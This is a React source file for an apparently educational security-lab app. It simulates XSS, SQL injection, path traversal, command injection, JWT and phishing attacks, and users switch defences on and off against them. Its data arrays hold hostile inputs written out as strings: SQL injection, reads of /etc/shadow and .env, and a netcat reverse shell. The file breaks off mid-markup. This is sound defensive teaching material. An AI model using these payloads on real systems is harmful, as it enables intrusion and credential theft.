import { useState, useEffect, useRef, useCallback } from "react";
import {
  Shield, Zap, Database, Lock, Mail, Wifi, List,
  ArrowLeft, ArrowRight, CheckCircle, XCircle, RotateCcw,
  Eye, EyeOff, Play, Square, Terminal, Download,
  ChevronDown, ChevronRight, Activity, Award, BookOpen,
  AlertTriangle, Info, Globe, Link, ExternalLink, Users, Layers, FlaskConical
} from "lucide-react";

// ─── UTILITIES ────────────────────────────────────────────────────────────────
const uid = () => Math.random().toString(36).substr(2, 9);
const ts  = () => new Date().toLocaleTimeString("en-US", { hour12: false });
const mkEvent = (type, source, target, severity, message) => ({
  id: uid(), timestamp: ts(), type, source, target, severity, message,
});
const escapeHTML = (s) =>
  String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")
    .replace(/"/g,"&quot;").replace(/'/g,"&#039;");
const stripTags = (s) =>
  String(s).replace(/<[^>]*>/g,"").replace(/javascript:/gi,"[removed:]");
const calcEntropy = (pwd) => {
  let cs = 0;
  if (/[a-z]/.test(pwd)) cs += 26;
  if (/[A-Z]/.test(pwd)) cs += 26;
  if (/[0-9]/.test(pwd))  cs += 10;
  if (/[^a-zA-Z0-9]/.test(pwd)) cs += 32;
  const bits = Math.round(pwd.length * Math.log2(cs || 1));
  const strength =
    bits < 28 ? "Very Weak" : bits < 40 ? "Weak" :
    bits < 60 ? "Moderate"  : bits < 80 ? "Strong" : "Very Strong";
  return { bits, strength };
};
const simpleHash = (str) => {
  let h = 5381;
  for (let i = 0; i < str.length; i++) h = (h * 33) ^ str.charCodeAt(i);
  return (h >>> 0).toString(16).padStart(8,"0").repeat(4).substring(0,32);
};

// ─── DATA ────────────────────────────────────────────────────────────────────
const XSS_PAYLOADS = [
  { id:"x1", label:"Script Tag",       val:'<script>alert("XSS")</script>',        sev:"critical" },
  { id:"x2", label:"Event Handler",    val:'<img src=x onerror="stealCookies()">',  sev:"high"    },
  { id:"x3", label:"SVG Payload",      val:"<svg onload=\"redirect('evil.com')\">",  sev:"high"    },
  { id:"x4", label:"Iframe Injection", val:'<iframe src="javascript:void(0)">',    sev:"medium"   },
  { id:"x5", label:"Safe Input",       val:"Hello, World!",                          sev:"info"    },
];
const SQL_PAYLOADS = [
  { id:"s1", label:"Auth Bypass",    val:"' OR '1'='1",                           sev:"critical" },
  { id:"s2", label:"Drop Table",     val:"'; DROP TABLE users;--",                sev:"critical" },
  { id:"s3", label:"Comment Inject", val:"admin'--",                              sev:"high"     },
  { id:"s4", label:"UNION Extract",  val:"' UNION SELECT password FROM users--",  sev:"critical" },
  { id:"s5", label:"Normal Login",   val:"john_doe",                              sev:"info"     },
];
const FAKE_DB = [
  { id:1, username:"alice", email:"alice@corp.com", role:"user",  password:"hashed_a1b2" },
  { id:2, username:"bob",   email:"bob@corp.com",   role:"user",  password:"hashed_c3d4" },
  { id:3, username:"admin", email:"admin@corp.com", role:"admin", password:"hashed_e5f6" },
  { id:4, username:"carol", email:"carol@corp.com", role:"user",  password:"hashed_g7h8" },
];
const PHISHING_EMAILS = [
  {
    id:1, risk:"high", riskScore:91,
    from:"security@paypa1-alerts.com",
    subject:"URGENT: Your account will be suspended in 24h",
    date:"Today, 9:14 AM",
    indicators:["lookalikeDomain","urgency","credentialRequest","suspiciousLink"],
    body:`Dear Valued Customer,

Suspicious activity was detected on your account.
Your access will be SUSPENDED unless you verify now.

Click here: http://paypa1-alerts.com/verify?t=9f2k

Please enter: Email, Password, Date of Birth, SSN

You have 24 hours before permanent account closure.

PayPal Security Team`,
  },
  {
    id:2, risk:"medium", riskScore:68,
    from:"hr@yourcompany-portal.net",
    subject:"Q4 Bonus — Confirm Banking Details by EOD",
    date:"Today, 11:30 AM",
    indicators:["suspiciousDomain","urgency","socialEngineering"],
    body:`Hello,

Your Q4 performance bonus has been approved by leadership.

To process the payment, confirm your banking information
at our secure portal today:
  https://yourcompany-portal.net/banking

This offer expires at midnight tonight.

Human Resources`,
  },
  {
    id:3, risk:"low", riskScore:6,
    from:"noreply@github.com",
    subject:"[GitHub] New sign-in to your account",
    date:"Yesterday, 3:44 PM",
    indicators:[],
    body:`Hi there,

A new sign-in was detected on your GitHub account:
  Device:   Chrome on macOS 14
  Location: San Francisco, CA
  Time:     Yesterday at 3:44 PM

If this was you, no action is needed. Otherwise,
visit github.com/settings/security to review access.

The GitHub Team`,
  },
];
const INDICATOR_META = {
  lookalikeDomain:   { label:"Lookalike Domain",        Icon:Link,         desc:"Domain mimics a legitimate brand" },
  urgency:           { label:"Urgency / Pressure",       Icon:AlertTriangle,desc:"Artificial time pressure to bypass judgment" },
  credentialRequest: { label:"Credential Request",       Icon:Lock,         desc:"Asks for passwords or sensitive data" },
  suspiciousLink:    { label:"Suspicious Link",          Icon:ExternalLink, desc:"URL doesn't match the claimed sender" },
  suspiciousDomain:  { label:"Suspicious Sender Domain", Icon:Globe,        desc:"Sender domain unrelated to claimed organization" },
  socialEngineering: { label:"Social Engineering",       Icon:Users,        desc:"Uses rewards or flattery to manipulate" },
};
const INJECT_RE = [/\bOR\b.*['"]/i, /--/, /;.*(DROP|DELETE|INSERT|UPDATE)/i, /UNION\s+SELECT/i, /'.*=/i];
const OUTCOME_META = {
  waf:      { color:"green", label:"BLOCKED BY WAF" },
  validate: { color:"green", label:"BLOCKED BY VALIDATION" },
  safe:     { color:"blue",  label:"SAFE — PARAMETERIZED" },
  pwned:    { color:"red",   label:"INJECTION SUCCEEDED" },
  normal:   { color:"slate", label:"NORMAL QUERY" },
};
// Password wordlist for the brute-force simulation
const PWD_WORDLIST = [
  "password","123456","admin","letmein","monkey","dragon","qwerty","sunshine",
  "master","welcome","iloveyou","football","login","pass","guest","test",
  "user","abc123","hello","root","secret","charlie","baseball","michael",
  "jessica","princess","shadow","superman","batman","trustno1",
];

// ─── PAGE 2 DATA ─────────────────────────────────────────────────────────────
const TRAVERSAL_PAYLOADS = [
  { id:"tr1", label:"Linux passwd",   val:"../../../../etc/passwd",           sev:"critical" },
  { id:"tr2", label:"Linux shadow",   val:"../../../../etc/shadow",           sev:"critical" },
  { id:"tr3", label:"DB config",      val:"../../../config/database.yml",     sev:"high"     },
  { id:"tr4", label:".env secrets",   val:"../../../.env",                    sev:"high"     },
  { id:"tr5", label:"Safe file",      val:"invoice_2024_q4.pdf",              sev:"info"     },
];
const FAKE_FILE_CONTENTS = {
  "../../../../etc/passwd":    "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin/nologin\nwww-data:x:33:33:/var/www:/usr/sbin/nologin\napp_user:x:1001:1001::/home/app_user:/bin/bash",
  "../../../../etc/shadow":    "root:$6$rounds=5000$abc$LONGHASH1:19000:0:99999:7:::\napp_user:$6$rounds=5000$xyz$LONGHASH2:19000:0:99999:7:::",
  "../../../config/database.yml":"production:\n  adapter: postgresql\n  host: db.internal\n  database: app_prod\n  username: db_app\n  password: Sup3rS3cr3t!Pass\n  port: 5432",
  "../../../.env":             "DATABASE_URL=postgres://app:S3cr3t@db/prod\nJWT_SECRET=my-weak-jwt-secret-123\nSTRIPE_KEY=sk_live_4xF9mK2pQrT8\nAWS_SECRET=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLE",
  "invoice_2024_q4.pdf":       "(Binary PDF — 142 KB — served normally from /var/www/uploads/)",
};
const CMD_PAYLOADS = [
  { id:"c1", label:"Read shadow",    val:"8.8.8.8; cat /etc/shadow",                  sev:"critical" },
  { id:"c2", label:"List web dir",   val:"localhost | ls -la /var/www/html",           sev:"high"     },
  { id:"c3", label:"Current user",   val:"8.8.8.8 && id",                             sev:"medium"   },
  { id:"c4", label:"Reverse shell",  val:"8.8.8.8; nc -e /bin/bash 10.0.0.1 4444",   sev:"critical" },
  { id:"c5", label:"Safe input",     val:"8.8.8.8",                                   sev:"info"     },
];
const FAKE_CMD_OUTPUT = {
  "8.8.8.8; cat /etc/shadow":         "PING 8.8.8.8: 64 bytes from 8.8.8.8: icmp_seq=1\n\nroot:$6$rounds=5000$abc$HASH:19000:0:99999:7:::\napp_user:$6$rounds=5000$xyz$HASH2:19000:0:99999:7:::",
  "localhost | ls -la /var/www/html":  "total 48\ndrwxr-xr-x www-data index.php\ndrwxr-xr-x www-data uploads/\n-rw------- www-data .env\n-rw-r--r-- www-data config.php",
  "8.8.8.8 && id":                    "PING 8.8.8.8: 64 bytes from 8.8.8.8: icmp_seq=1\n\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
  "8.8.8.8; nc -e /bin/bash 10.0.0.1 4444":"PING 8.8.8.8: 64 bytes...\n[TCP connection to 10.0.0.1:4444 opened]\n[Reverse shell established — attacker has interactive access]",
  "8.8.8.8":                          "PING 8.8.8.8 56 bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=15.2 ms\n64 bytes from 8.8.8.8: icmp_seq=2 ttl=118 time=14.8 ms\n\n2 packets transmitted, 2 received, 0% packet loss",
};
const FAKE_RECORDS = {
  1042:{ name:"Jane Doe",   dob:"Mar 12 1985", blood:"A+", diagnosis:"Hypertension",     meds:"Lisinopril 10mg",    physician:"Dr. M. Smith", lastVisit:"Nov 20 2024" },
  1043:{ name:"Bob Chen",   dob:"Jul 24 1990", blood:"O−", diagnosis:"Type 2 Diabetes",  meds:"Metformin 500mg",    physician:"Dr. R. Patel", lastVisit:"Dec 01 2024" },
  1044:{ name:"Alice Wang", dob:"Jan 30 1978", blood:"B+", diagnosis:"Anxiety Disorder", meds:"Sertraline 50mg",    physician:"Dr. S. Kim",   lastVisit:"Dec 15 2024" },
};
// Pre-computed looking JWT pieces (header is genuinely correct base64)
const JWT_HEADER_B64  = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9";
const JWT_ORIG_B64    = "eyJzdWIiOiJ1c2VyXzlmMmEiLCJuYW1lIjoiSmFuZSBEb2UiLCJyb2xlIjoidXNlciJ9";
const JWT_TAMP_B64    = "eyJzdWIiOiJ1c2VyXzlmMmEiLCJuYW1lIjoiSmFuZSBEb2UiLCJyb2xlIjoiYWRtaW4ifQ";
const JWT_SIG         = "xK9mLp2qRv7wN3sX4jD8kF";

// ─── DASHBOARD MODULE DEFINITIONS ────────────────────────────────────────────
const DASH_MODULES = [
  {
    id:"xss", Icon:Zap, label:"XSS Playground", difficulty:"Beginner",
    shortDesc:"Cross-Site Scripting attacks",
    fullDesc:"Cross-Site Scripting lets attackers inject malicious scripts into pages viewed by other users. When a browser renders untrusted input as HTML, it executes attacker-controlled code with the full trust level of the legitimate site.",
    concepts:["Input Sanitization","Output Encoding","Content Security Policy"],
    color:"amber",
  },
  {
    id:"sqli", Icon:Database, label:"SQL Injection", difficulty:"Beginner",
    shortDesc:"Database query manipulation",
    fullDesc:"SQL Injection exploits unsafe string concatenation. By inserting SQL syntax into user-controlled fields, attackers can bypass authentication, extract data, or destroy records without needing valid credentials.",
    concepts:["Parameterized Queries","Input Validation","Web Application Firewall"],
    color:"red",
  },
  {
    id:"password", Icon:Lock, label:"Password Cracker", difficulty:"Beginner",
    shortDesc:"Brute-force attacks and hashing",
    fullDesc:"Brute-force attacks systematically try every possible combination. Weak passwords, missing salts, and absent rate limiting allow attackers to recover credentials from stolen hash databases.",
    concepts:["Password Entropy","Salting","Rate Limiting"],
    color:"blue",
  },
  {
    id:"phishing", Icon:Mail, label:"Phishing Analyzer", difficulty:"Intermediate",
    shortDesc:"Social engineering via email",
    fullDesc:"Phishing emails impersonate trusted organizations to steal credentials. They rely on lookalike domains, urgency, and social engineering to bypass critical thinking. Recognizing the tells is the first line of defense.",
    concepts:["Lookalike Domains","Urgency Tactics","Credential Harvesting"],
    color:"orange",
  },
  {
    id:"packet", Icon:Wifi, label:"Packet Spoofing", difficulty:"Intermediate",
    shortDesc:"Network-layer IP address forgery",
    fullDesc:"IP spoofing forges the source address in packet headers so malicious traffic appears to come from a trusted host. Without filtering, servers process and respond to these packets as legitimate.",
    concepts:["IP Source Validation","Packet Filtering","Deep Packet Inspection"],
    color:"purple",
  },
];

const DASH_MODULES_P2 = [
  {
    id:"csrf", Icon:Shield, label:"CSRF Attack", difficulty:"Beginner",
    shortDesc:"Cross-site request forgery",
    fullDesc:"CSRF tricks a victim's browser into sending an authenticated request to a site they're already logged into — without their knowledge. Because browsers attach session cookies automatically, the server can't tell a forged request from a real one unless you add explicit proof of intent.",
    concepts:["CSRF Tokens","SameSite Cookies","Origin Header Validation"],
    color:"teal",
  },
  {
    id:"traversal", Icon:List, label:"Path Traversal", difficulty:"Beginner",
    shortDesc:"Escaping the web root with ../",
    fullDesc:"Directory traversal attacks use sequences like ../../ to climb out of the intended base directory and read arbitrary files — system configs, environment variables, and password hashes that the web server process can access.",
    concepts:["Path Canonicalization","Allowlisting","Chroot Jails"],
    color:"green",
  },
  {
    id:"cmdinject", Icon:Terminal, label:"Command Injection", difficulty:"Intermediate",
    shortDesc:"Injecting OS commands via user input",
    fullDesc:"Command injection occurs when user-supplied input is passed unsanitized to a shell. Shell metacharacters like ; and | let attackers append arbitrary commands — potentially spawning an interactive reverse shell with the web server's privileges.",
    concepts:["Parameterized Execution","Input Sanitization","Allowlisting"],
    color:"rose",
  },
  {
    id:"idor", Icon:Users, label:"Broken Access Control", difficulty:"Intermediate",
    shortDesc:"Accessing other users' resources (IDOR)",
    fullDesc:"Insecure Direct Object References expose sequential internal IDs in URLs or API parameters. When the server checks authentication (logged in?) but not authorization (owns this record?), incrementing an ID leaks other users' private data.",
    concepts:["Server-side Authorization","Indirect References","Least Privilege"],
    color:"purple",
  },
  {
    id:"jwt", Icon:Lock, label:"JWT Tampering", difficulty:"Intermediate",
    shortDesc:"Forging authentication tokens",
    fullDesc:"JWTs encode claims like user role in a base64 payload. They are not encrypted — anyone can read and modify them. Without signature verification, a server blindly trusts whatever role is in the token, making privilege escalation trivial.",
    concepts:["Signature Verification","Algorithm Enforcement","Strong Secrets"],
    color:"blue",
  },
];

// ─── SHARED UI COMPONENTS ────────────────────────────────────────────────────
const Toggle = ({ enabled, onChange, label, desc, disabled }) => (
  <div className={`flex items-start gap-3 ${disabled ? "opacity-40 pointer-events-none" : ""}`}>
    <button onClick={() => onChange(!enabled)} aria-pressed={enabled} disabled={disabled}
      className={`mt-0.5 relative w-10 h-5 rounded-full flex-shrink-0 transition-colors duration-200 ${enabled ? "bg-cyan-500" : "bg-slate-700"}`}>
      <span className="absolute top-0.5 w-4 h-4 bg-white rounded-full shadow transition-all duration-200"
        style={{left: enabled ? "20px" : "4px"}}/>
    </button>
    <div>
      <div className="text-sm text-slate-300 leading-tight">{label}</div>
      {desc && <div className="text-xs text-slate-600 mt-0.5">{desc}</div>}
    </div>
  </div>
);
const Card = ({ children, className = "" }) => (
  <div className={`bg-slate-900 border border-slate-800 rounded-xl p-4 ${className}`}>{children}</div>
);
const SectionHead = ({ children }) => (
  <h3 className="text-xs font-semibold text-slate-500 uppercase tracking-widest mb-3">{children}</h3>
);
const StatusPill = ({ ok, label }) => (
  <div className={`flex items-center gap-1.5 text-xs px-2.5 py-1 rounded-full border ${ok ? "border-green-500/30 bg-green-500/10 text-green-400" : "border-red-500/30 bg-red-500/10 text-red-400"}`}>
    <span className={`w-1.5 h-1.5 rounded-full flex-shrink-0 ${ok ? "bg-green-500 animate-pulse" : "bg-red-500"}`}/>
    {label}
  </div>
);
const LabHeader = ({ title, subtitle, statusOk, statusLabel, onBack }) => (
  <div className="flex items-center gap-3 mb-6">
    <button onClick={onBack}
      className="flex items-center gap-1.5 text-xs bg-slate-800 hover:bg-slate-700 border border-slate-700 text-slate-400 hover:text-slate-200 px-3 py-2 rounded-lg transition-colors flex-shrink-0">
      <ArrowLeft size={14}/> Labs
    </button>
    <div className="flex-1 min-w-0">
      <h2 className="text-lg font-bold text-white">{title}</h2>
      <p className="text-slate-500 text-xs">{subtitle}</p>
    </div>
    {statusLabel && <StatusPill ok={statusOk} label={statusLabel}/>}
  </div>
);

// ─── ACCENT COLOUR MAPS (avoid purged dynamic class strings) ─────────────────
const ACCENT_BORDER = { amber:"border-amber-500/20", red:"border-red-500/20", blue:"border-blue-500/20", orange:"border-orange-500/20", purple:"border-purple-500/20", teal:"border-teal-500/20", green:"border-green-500/20", rose:"border-rose-500/20", violet:"border-violet-500/20", cyan:"border-cyan-500/20" };
const ACCENT_TEXT   = { amber:"text-amber-400", red:"text-red-400", blue:"text-blue-400", orange:"text-orange-400", purple:"text-purple-400", teal:"text-teal-400", green:"text-green-400", rose:"text-rose-400", violet:"text-violet-400", cyan:"text-cyan-400" };

// ─── SOLUTION PEEK HELPER ─────────────────────────────────────────────────────
const ChallengeBox = ({ accent, title, children, showSolution, onToggle, solutionContent }) => (
  <div className={`bg-slate-900 border ${ACCENT_BORDER[accent]||"border-slate-700"} rounded-xl p-4`}>
    <div className="flex items-start justify-between gap-4">
      <div className="flex-1">
        <div className={`text-xs font-semibold ${ACCENT_TEXT[accent]||"text-slate-400"} uppercase tracking-widest mb-1`}>{title}</div>
        <div className="text-sm text-slate-300">{children}</div>
      </div>
      <button onClick={onToggle}
        className="flex-shrink-0 flex items-center gap-1.5 text-xs text-slate-600 hover:text-slate-400 border border-slate-800 hover:border-slate-700 px-2.5 py-1.5 rounded-lg transition-colors whitespace-nowrap mt-0.5">
        {showSolution ? <EyeOff size={11}/> : <Eye size={11}/>}
        {showSolution ? "Hide Fix" : "Vulnerability Fix"}
      </button>
    </div>
    {showSolution && (
      <div className="mt-3 pt-3 border-t border-slate-800">
        <div className="flex items-center gap-1.5 mb-2">
          <AlertTriangle size={11} className="text-amber-500/70"/>
          <span className="text-[11px] text-amber-700">Try the challenge yourself first — reading the fix reduces the learning value.</span>
        </div>
        <div className="text-sm text-slate-400 leading-relaxed">{solutionContent}</div>
      </div>
    )}
  </div>
);

// ─── CHALLENGE RESULT ────────────────────────────────────────────────────────
// showAnswer + onToggleAnswer lifted to parent so PhishingLab can share the flag
// with its indicator coloring logic.
const ChallengeResult = ({ state, successContent, failMsg, revealContent, onRetry, showAnswer, onToggleAnswer, successTitle, failTitle, neutralMsg }) => {
  if (!state || state === "idle") return null;
  if (state === "neutral") return (
    <div className="mt-4 bg-slate-800/50 border border-slate-700 rounded-xl p-4 flex items-start gap-3">
      <Info size={16} className="text-slate-500 flex-shrink-0 mt-0.5"/>
      <p className="text-slate-500 text-sm">{neutralMsg || "No threat detected — this input is benign. Try a dangerous payload to test your defenses."}</p>
    </div>
  );
  if (state === "success") return (
    <div className="mt-4 bg-green-900/10 border border-green-500/30 rounded-xl p-4">
      <div className="flex items-center gap-2 mb-3">
        <CheckCircle size={17} className="text-green-400 flex-shrink-0"/>
        <span className="text-green-400 font-semibold text-sm">{successTitle || "Attack Stopped"}</span>
      </div>
      <div className="text-slate-300 text-sm leading-relaxed">{successContent}</div>
    </div>
  );
  if (state === "fail") return (
    <div className="mt-4 bg-red-900/10 border border-red-500/30 rounded-xl p-4">
      <div className="flex items-center gap-2 mb-2">
        <XCircle size={17} className="text-red-400 flex-shrink-0"/>
        <span className="text-red-400 font-semibold text-sm">{failTitle || "Attack Succeeded"}</span>
      </div>
      <p className="text-slate-400 text-sm mb-4">{failMsg || "The attack was not stopped. Adjust your defenses and try again."}</p>
      <div className="flex gap-2 flex-wrap">
        <button onClick={onRetry}
          className="flex items-center gap-1.5 text-xs bg-slate-800 hover:bg-slate-700 border border-slate-700 text-slate-300 px-3 py-1.5 rounded-lg transition-colors">
          <RotateCcw size={12}/> Try Again
        </button>
        <button onClick={() => onToggleAnswer?.(!showAnswer)}
          className="flex items-center gap-1.5 text-xs bg-slate-800 hover:bg-slate-700 border border-cyan-500/30 text-cyan-400 px-3 py-1.5 rounded-lg transition-colors">
          {showAnswer ? <EyeOff size={12}/> : <Eye size={12}/>}
          {showAnswer ? "Hide Answer" : "Reveal Answer"}
        </button>
      </div>
      {showAnswer && (
        <div className="mt-4 bg-slate-800/60 border border-slate-700 rounded-xl p-4">
          <div className="text-xs font-semibold text-slate-500 uppercase tracking-widest mb-2">Correct Approach</div>
          <div className="text-slate-300 text-sm leading-relaxed">{revealContent}</div>
        </div>
      )}
    </div>
  );
  return null;
};

// ─── XSS LAB ─────────────────────────────────────────────────────────────────
const XSSLab = ({ addLog, addScore, onBack }) => {
  const [selId, setSelId]       = useState("x1");
  const [payload, setPay]       = useState(XSS_PAYLOADS[0].val);
  const [def, setDef]           = useState({ sanitize:false, encode:false, csp:false });
  const [labState, setLabState] = useState("idle");
  const [processed, setProc]    = useState("");
  const [applied, setApplied]   = useState([]);
  const scoredPayloads          = useRef(new Set());
  const [justScored, setJustScored]   = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);
  // Controls the simulated JS alert dialog overlay
  const [alertOpen, setAlertOpen]       = useState(false);

  useEffect(() => { setShowAnswer(false); }, [labState]);
  const reset = () => { setLabState("idle"); setProc(""); setApplied([]); setJustScored(false); setAlertOpen(false); };

  const run = () => {
    const hasScript = /<script|onerror|onload|javascript:|<iframe|<svg/i.test(payload);
    if (!hasScript) { setLabState("neutral"); return; }
    const app = [];
    let proc = payload;
    if (def.sanitize) { proc = stripTags(proc); app.push("Input Sanitization"); }
    if (def.encode)   { proc = escapeHTML(proc); app.push("Output Encoding"); }
    if (def.csp)       app.push("Content Security Policy");
    const blocked = app.length > 0;
    setProc(proc); setApplied(app);
    if (blocked) {
      setLabState("success");
      addLog(mkEvent("xss","Attacker","Browser DOM","info",`XSS blocked by: ${app.join(", ")}`));
      const key = `${payload}|${app.join("")}`;
      if (!scoredPayloads.current.has(key)) { addScore("xss",25); scoredPayloads.current.add(key); setJustScored(true); }
      else setJustScored(false);
    } else {
      setLabState("fail");
      setAlertOpen(true); // Show the fake browser JS alert
      addLog(mkEvent("xss","Attacker","Browser DOM","critical",`XSS executed: ${payload.slice(0,40)}`));
    }
  };

  const pick = (id) => { setSelId(id); const p=XSS_PAYLOADS.find(x=>x.id===id); if(p) setPay(p.val); reset(); };

  // Extract what the simulated alert would display
  const alertText = (() => {
    const m = payload.match(/alert\(["']([^"']*)["']\)/);
    if (m) return m[1];
    if (/stealCookies/i.test(payload)) return "session_id=abc123ef; user=admin";
    if (/redirect/i.test(payload)) return "Redirecting to evil.com…";
    return "Script executed!";
  })();

  const xssReveal = (
    <p>Enable <strong className="text-slate-200">Output Encoding</strong> to convert special characters into HTML entities (so <code className="text-slate-400">&lt;script&gt;</code> renders as visible text, not code), <strong className="text-slate-200">Input Sanitization</strong> to strip tags server-side before storage, or <strong className="text-slate-200">Content Security Policy</strong> to block inline script execution at the browser. Any one of these stops the attack; all three provide defense in depth.</p>
  );

  const successContent = (
    <div>
      <p>The payload was neutralized before it could execute. {applied.includes("Output Encoding") ? "Output Encoding converted the angle brackets and quotes into HTML entities — the browser now renders them as visible characters instead of markup, so no script runs." : applied.includes("Input Sanitization") ? "Input Sanitization stripped the HTML tags from the comment before it was stored, so nothing executable reached the page." : "Content Security Policy's script-src directive prevented the browser from executing any inline script, even though the payload reached the DOM."}{applied.length > 1 ? " Multiple defenses working in layers is called defense in depth." : ""}</p>
    </div>
  );

  return (
    <div className="space-y-4">
      <LabHeader title="XSS Playground" subtitle="Prevent a malicious comment from executing in the browser" statusOk label="Safe Simulation" onBack={onBack}/>

      <ChallengeBox accent="amber" title="Challenge"
        showSolution={showSolution} onToggle={() => setShowSolution(v=>!v)} solutionContent={xssReveal}>
        An attacker is posting a malicious comment to a vulnerable forum. Configure your server-side defenses, then click <strong>Post Comment</strong> to see whether the browser executes the script or renders it safely.
      </ChallengeBox>

      <div className="grid grid-cols-2 gap-4">
        {/* ── Left: controls ── */}
        <div className="space-y-3">
          <Card>
            <SectionHead>Attacker's Payload</SectionHead>
            <select className="w-full bg-slate-800 border border-slate-700 text-slate-300 text-sm rounded-lg px-3 py-2 mb-3"
              value={selId} onChange={e=>pick(e.target.value)}>
              {XSS_PAYLOADS.map(p=><option key={p.id} value={p.id}>{p.label} — {p.sev}</option>)}
            </select>
            <label className="text-xs text-slate-600 block mb-1">Payload (the comment text being submitted)</label>
            <textarea rows={3}
              className="w-full bg-slate-800 border border-slate-700 text-green-400 font-mono text-xs rounded-lg px-3 py-2 resize-none"
              value={payload} onChange={e=>{setPay(e.target.value); reset();}}/>
          </Card>

          <Card>
            <SectionHead>Server Defenses</SectionHead>
            <p className="text-xs text-slate-600 mb-3 leading-relaxed">Enable defenses before posting. Without any, the comment is stored and served to every visitor's browser exactly as typed.</p>
            <div className="space-y-3">
              <Toggle enabled={def.sanitize} onChange={v=>{setDef(d=>({...d,sanitize:v})); reset();}} label="Input Sanitization" desc="Strip HTML tags from the comment at the server before storage"/>
              <Toggle enabled={def.encode}   onChange={v=>{setDef(d=>({...d,encode:v})); reset();}}   label="Output Encoding"   desc="Escape HTML entities when rendering the comment on the page"/>
              <Toggle enabled={def.csp}      onChange={v=>{setDef(d=>({...d,csp:v})); reset();}}      label="Content Security Policy" desc="Send a CSP header telling the browser to block inline scripts"/>
            </div>
            <button onClick={run}
              className="mt-4 w-full flex items-center justify-center gap-2 bg-cyan-700 hover:bg-cyan-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors text-sm">
              <Play size={14}/> Post Comment
            </button>
          </Card>

          {/* Defense pipeline */}
          <Card>
            <SectionHead>Processing Pipeline</SectionHead>
            <div className="flex items-start gap-0.5">
              {[
                { label:"Input",   active:true, warn:false },
                { label:"Sanitize",active:def.sanitize, defense:true },
                { label:"Encode",  active:def.encode,   defense:true },
                { label:"CSP",     active:def.csp,      defense:true },
                { label:"Browser", active:true, warn:labState==="fail" },
              ].map((n,i)=>(
                <div key={i} className="flex-1 flex flex-col items-center gap-1">
                  {i > 0 && (
                    <div className={`w-full h-px mt-[18px] ${n.defense&&n.active?"bg-green-500/70":"bg-slate-700"}`}/>
                  )}
                  <div className={`w-full text-center text-[9px] py-1 rounded border leading-tight ${
                    n.defense&&n.active ? "border-green-500/40 text-green-400 bg-green-900/10"
                    : n.defense         ? "border-slate-800 text-slate-700 bg-transparent"
                    : n.warn            ? "border-red-500/40 text-red-400 bg-red-900/10 animate-pulse"
                    :                    "border-slate-700 text-slate-500"}`}>
                    {n.label}
                  </div>
                </div>
              ))}
            </div>
            <p className="text-[11px] text-slate-600 leading-relaxed mt-3">
              XSS works because browsers treat content from the same site as trusted. If attacker-supplied text reaches the DOM as markup, the browser executes it with full site privileges.
            </p>
          </Card>
        </div>

        {/* ── Right: browser preview ── */}
        <div className="space-y-3">
          <Card>
            <SectionHead>Simulated Browser</SectionHead>
            <div className="rounded-lg overflow-hidden border border-slate-700">
              {/* Browser chrome */}
              <div className="bg-slate-700 px-3 py-2 flex items-center gap-2">
                <div className="flex gap-1">
                  <div className="w-2 h-2 rounded-full bg-red-500/60"/>
                  <div className="w-2 h-2 rounded-full bg-amber-500/60"/>
                  <div className="w-2 h-2 rounded-full bg-green-500/60"/>
                </div>
                <div className="bg-slate-600 rounded px-2 py-0.5 text-[10px] text-slate-400 flex-1 font-mono truncate">
                  https://forum.example.com/thread/42#comments
                </div>
              </div>

              {/* Page content */}
              <div className="bg-slate-950 p-3 relative" style={{minHeight:200}}>
                <div className="text-[10px] text-slate-600 font-semibold mb-2 tracking-wide">COMMENTS (3)</div>

                {/* Legitimate comments */}
                <div className="space-y-1.5 mb-2">
                  {[["alice_99","Great article, very helpful!"],["dev_bob","Bookmarked — thanks for sharing."]].map(([u,t])=>(
                    <div key={u} className="bg-slate-800/60 rounded-lg p-2">
                      <span className="text-[10px] font-semibold text-cyan-400">{u}</span>
                      <p className="text-[11px] text-slate-300 mt-0.5">{t}</p>
                    </div>
                  ))}
                </div>

                {/* Attacker's comment — rendered output */}
                {labState !== "idle" && labState !== "neutral" && (
                  <div className={`rounded-lg p-2 border ${labState==="fail"?"border-red-500/40 bg-red-950/30":"border-green-500/20 bg-green-950/20"}`}>
                    <span className={`text-[10px] font-semibold ${labState==="fail"?"text-red-400":"text-amber-400"}`}>attacker_x</span>
                    <p className={`text-[11px] mt-0.5 font-mono break-all ${labState==="fail"?"text-red-300":"text-slate-400"}`}>
                      {labState === "fail"
                        ? payload
                        : (processed || "(content removed by sanitization)")}
                    </p>
                    {labState === "success" && (
                      <div className="flex items-center gap-1 mt-1.5">
                        <CheckCircle size={10} className="text-green-400"/>
                        <span className="text-[10px] text-green-400">Rendered as plain text — no script executed</span>
                      </div>
                    )}
                  </div>
                )}

                {labState === "idle" && (
                  <div className="text-center text-slate-700 text-[11px] pt-6">
                    Post a comment above to see the result here
                  </div>
                )}

                {/* ── Simulated JS alert dialog overlay ── */}
                {alertOpen && (
                  <div className="absolute inset-0 bg-slate-950/80 flex items-center justify-center" style={{zIndex:10}}>
                    <div style={{background:"#e8e8e8", border:"2px solid #888", borderRadius:4, width:260, boxShadow:"4px 4px 0 #555"}}>
                      {/* Dialog title bar */}
                      <div style={{background:"#0055cc", padding:"4px 8px", display:"flex", alignItems:"center", justifyContent:"space-between"}}>
                        <span style={{color:"white", fontSize:11, fontFamily:"sans-serif"}}>JavaScript — forum.example.com</span>
                        <div style={{width:12, height:12, background:"#cc3333", border:"1px solid #aa0000", borderRadius:2, cursor:"pointer", display:"flex", alignItems:"center", justifyContent:"center"}}
                          onClick={() => setAlertOpen(false)}>
                          <span style={{color:"white", fontSize:9, lineHeight:1}}>×</span>
                        </div>
                      </div>
                      {/* Dialog body */}
                      <div style={{padding:"16px 12px", background:"#f4f4f4"}}>
                        <div style={{display:"flex", alignItems:"flex-start", gap:8, marginBottom:12}}>
                          <span style={{fontSize:20}}>⚠️</span>
                          <span style={{fontFamily:"monospace", fontSize:13, color:"#222", wordBreak:"break-all"}}>{alertText}</span>
                        </div>
                        <div style={{textAlign:"right"}}>
